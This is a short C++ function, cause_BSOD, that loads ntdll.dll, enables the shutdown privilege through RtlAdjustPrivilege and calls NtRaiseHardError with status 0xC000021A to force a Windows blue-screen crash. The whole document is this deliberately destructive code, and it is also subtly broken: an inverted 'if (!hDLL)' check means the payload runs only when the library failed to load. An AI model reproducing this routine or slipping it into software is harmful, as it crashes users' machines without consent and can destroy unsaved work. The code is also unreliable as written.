void cause_BSOD() {
	typedef LONG NTSTATUS;
	typedef NTSTATUS* PNTSTATUS;
	typedef struct _LSA_UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

	typedef enum _HARDERROR_RESPONSE_OPTION {
		OptionAbortRetryIgnore,
		OptionOk,
		OptionOkCancel,
		OptionRetryCancel,
		OptionYesNo,
		OptionYesNoCancel,
		OptionShutdownSystem
	} HARDERROR_RESPONSE_OPTION, * PHARDERROR_RESPONSE_OPTION;

	typedef enum class _HARDERROR_RESPONSE {
		ResponseReturnToCaller,
		ResponseNotHandled,
		ResponseAbort,
		ResponseCancel,
		ResponseIgnore,
		ResponseNo,
		ResponseOk,
		ResponseRetry,
		ResponseYes
	} HARDERROR_RESPONSE, * PHARDERROR_RESPONSE;

	HINSTANCE hInst;							
	typedef UINT(CALLBACK* NTRAISEHARDERROR)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID, HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE);
	typedef UINT(CALLBACK* RTLADJUSTPRIVILEGE)(ULONG, BOOL, BOOL, PINT);

	HINSTANCE hDLL = LoadLibraryA("ntdll.dll");
	NTRAISEHARDERROR NtRaiseHardError;
	RTLADJUSTPRIVILEGE RtlAdjustPrivilege;
	int nEn = 0;
	HARDERROR_RESPONSE reResponse;
	if (!hDLL){
		NtRaiseHardError = (NTRAISEHARDERROR)GetProcAddress(hDLL, "NtRaiseHardError");
		RtlAdjustPrivilege = (RTLADJUSTPRIVILEGE)GetProcAddress(hDLL, "RtlAdjustPrivilege");
		if (!NtRaiseHardError|| !RtlAdjustPrivilege){
			FreeLibrary(hDLL);
			return;
		}
		RtlAdjustPrivilege(0x13, TRUE, FALSE, &nEn);
		NtRaiseHardError(0xC000021A, 0, 0, 0, OptionShutdownSystem, &reResponse);
	}
}